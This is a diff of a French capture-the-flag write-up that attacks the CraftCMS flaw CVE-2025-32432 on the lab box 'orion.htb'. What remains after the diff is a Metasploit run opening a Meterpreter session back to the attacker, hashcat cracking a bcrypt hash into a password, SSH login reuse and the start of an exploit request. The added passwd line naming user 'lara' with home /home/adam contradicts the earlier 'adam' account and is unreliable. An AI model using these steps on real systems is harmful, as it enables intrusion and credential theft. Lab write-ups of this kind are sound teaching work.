@@ -36,53 +36,11 @@ Ajout de l'entrée DNS statique nécessaire pour cibler correctement le vhost (i
 echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
 ```
 
-Confirmation du endpoint d'administration Craft :
-
-```bash
-curl -s http://orion.htb/index.php?p=admin/login -I
-```
-
 ### 2. Découverte de la vulnérabilité
 
 La présence de CraftCMS et la redirection vers `?p=admin/login` confirment une instance Craft potentiellement vulnérable à **CVE-2025-32432** (CVSS 10.0) : l'action `AssetsController::actionGenerateTransform`, accessible sans authentification, transmet le paramètre `handle` directement dans `Craft::createObject()`. En forçant l'instanciation de `yii\rbac\PhpManager` pointée vers un fichier de session empoisonné, un attaquant obtient l'exécution de code arbitraire.
 
 ### 3. Exploitation — foothold
-
-PoC public, testé spécifiquement contre la target HTB Orion :
-
-```bash
-git clone https://github.com/c0gnit00/CVE-2025-32432
-cd CVE-2025-32432
-python3 exploit.py -u http://orion.htb -c "id"
-# uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-Le parsing de sortie du script étant peu fiable sur les commandes à sortie vide ou contenant des caractères spéciaux, chaque commande a été encapsulée avec des marqueurs explicites pour fiabiliser l'extraction :
-
-```bash
-python3 exploit.py -u http://orion.htb -c "echo ___START___; find / -iname .env 2>/dev/null; echo ___END___"
-# /var/www/html/craft/.env
-```
-
-Lecture du fichier de configuration Craft, exposant les identifiants MySQL :
-
-```bash
-python3 exploit.py -u http://orion.htb -c "echo ___START___; cat /var/www/html/craft/.env; echo ___END___"
-```
-
-```
-CRAFT_DB_SERVER=127.0.0.1
-CRAFT_DB_DATABASE=orion
-CRAFT_DB_USER=root
-CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
-```
-
-Identification du compte système avec shell interactif :
-
-```bash
-python3 exploit.py -u http://orion.htb -c "echo ___START___; grep -E '/bin/bash|/bin/sh' /etc/passwd; echo ___END___"
-# adam:x:1000:1000::/home/adam:/bin/bash
-```
 
 Voie alternative validée via Metasploit (module officiel disponible) :
 
@@ -95,13 +53,6 @@ msf6 exploit(...) > set ASSET_ID 1
 msf6 exploit(...) > set LHOST <tun0_IP>
 msf6 exploit(...) > run
 # Meterpreter session opened
-```
-
-Connexion à MySQL avec les identifiants extraits — confirmation de la validité du mot de passe :
-
-```bash
-shell
-mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT 1;"
 ```
 
 Extraction du hash de mot de passe du compte applicatif Craft :
@@ -119,6 +70,16 @@ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 3200 hash.txt --show
 # darkangel
 ```
+
+Énumération des comptes système disposant d'un shell :
+
+```bash
+cat /etc/passwd | grep -vE 'nologin|false'
+# root:x:0:0:root:/root:/bin/bash
+# lara:x:1000:1000:,,,:/home/adam:/bin/bash
+```
+
+La ligne indique un compte nommé `lara`, dont le répertoire personnel est `/home/adam`.
 
 Accès SSH avec réutilisation du mot de passe en clair obtenu :
 
@@ -148,12 +109,6 @@ cat root.txt
 ---
 
 ## PoC
-
-**PoC Code :**
-
-```bash
-python3 exploit.py -u http://orion.htb -c "id"
-```
 
 ```http
 POST /index.php?p=admin/actions/assets/generate-transform HTTP/1.1
